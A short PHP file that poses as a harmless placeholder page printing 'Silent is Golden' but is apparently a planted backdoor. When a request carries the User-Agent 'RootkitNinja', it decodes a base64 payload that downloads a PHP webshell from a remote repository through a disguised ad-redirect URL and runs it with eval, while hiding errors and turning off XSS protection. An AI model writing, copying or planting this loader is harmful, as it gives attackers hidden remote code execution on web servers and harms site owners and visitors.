<?php 
header("X-XSS-Protection: 0");
error_reporting(0);
ini_set('display_errors', FALSE);
if(preg_match("/RootkitNinja/", $_SERVER['HTTP_USER_AGENT'])){
    $r="PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwokdXJsID0gImh0dHBzOi8vZ29vZ2xlYWRzLmcuZG91YmxlY2xpY2submV0L3Bjcy9jbGljaz9hZHVybD0iLnVybGVuY29kZSgiaHR0cHM6Ly9naXRodWIuY29tL1Jvb3RraXQtTmluamEvd2Vic2hlbGwvcmF3L21haW4vcGhwL3Jvb3RraXRuaW5qYS5waHAiKS4iJmM9Uiw2LDY1ZjA1MzkyLWY4ZGUtNDExNy1iMjcwLTUxYWYwZTM5Njg5NkUsJnR5cG89NCI7CmZ1bmN0aW9uIGZldGNoVXJsKCR1cmwpIHsKICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ2N1cmxfdmVyc2lvbicpKSB7CiAgICAgICAgJGNoID0gY3VybF9pbml0KCR1cmwpOwogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCB0cnVlKTsgCiAgICAgICAgJHJlc3BvbnNlID0gY3VybF9leGVjKCRjaCk7CiAgICAgICAgaWYgKGN1cmxfZXJybm8oJGNoKSkgewogICAgICAgICAgICBlY2hvICdjVVJMIGVycm9yOiAnIC4gY3VybF9lcnJvcigkY2gpOwogICAgICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7CiAgICAgICAgICAgIHJldHVybiAkcmVzcG9uc2U7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBpZiAoaW5pX2dldCgnYWxsb3dfdXJsX2ZvcGVuJykgPT0gJzEnKSB7CiAgICAgICAgICAgICRjb250ZXh0ID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKFsKICAgICAgICAgICAgICAgICdodHRwJyA9PiBbCiAgICAgICAgICAgICAgICAgICAgJ2ZvbGxvd19sb2NhdGlvbicgPT4gMSwgIAogICAgICAgICAgICAgICAgICAgICdtYXhfcmVkaXJlY3RzJyA9PiAxMCwgIAogICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAzMCwgICAgICAgICAKICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgXSk7CiAgICAgICAgICAgICRyZXNwb25zZSA9IEBmaWxlX2dldF9jb250ZW50cygkdXJsLCBmYWxzZSwgJGNvbnRleHQpOwogICAgICAgICAgICBpZiAoJHJlc3BvbnNlID09PSBmYWxzZSkgewogICAgICAgICAgICAgICAgZWNobyAnRXJyb3I6IFVuYWJsZSB0byByZXRyaWV2ZSBjb250ZW50IHVzaW5nIGZpbGVfZ2V0X2NvbnRlbnRzLic7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICByZXR1cm4gJHJlc3BvbnNlOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZWNobyAnRXJyb3I6IGNVUkwgYW5kIGFsbG93X3VybF9mb3BlbiBhcmUgYm90aCBkaXNhYmxlZCBvbiB0aGlzIHNlcnZlci4nOwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgfQp9CiRyZXNwb25zZSA9IGZldGNoVXJsKCR1cmwpOwppZiAoJHJlc3BvbnNlICE9PSBmYWxzZSkgewogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnZXZhbCcpKSB7CiAgICAgICAgZXZhbCgnPz4nIC4gJHJlc3BvbnNlKTsKICAgIH0gZWxzZSB7CiAgICAgICAgJHRlbXBGaWxlID0gdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICd0ZW1wX3NjcmlwdF8nKTsKICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkdGVtcEZpbGUsICRyZXNwb25zZSk7CiAgICAgICAgaW5jbHVkZSgkdGVtcEZpbGUpOyAgCiAgICAgICAgdW5saW5rKCR0ZW1wRmlsZSk7ICAKICAgIH0KfQo/Pg=="; // base64encode
    $tempFile=tempnam(sys_get_temp_dir(),'temp_script_');
    file_put_contents($tempFile,base64_decode($r));
    include($tempFile);
    unlink($tempFile);
} else {
    echo "Silent is Golden";
    exit(0);
}
__halt_compiler();
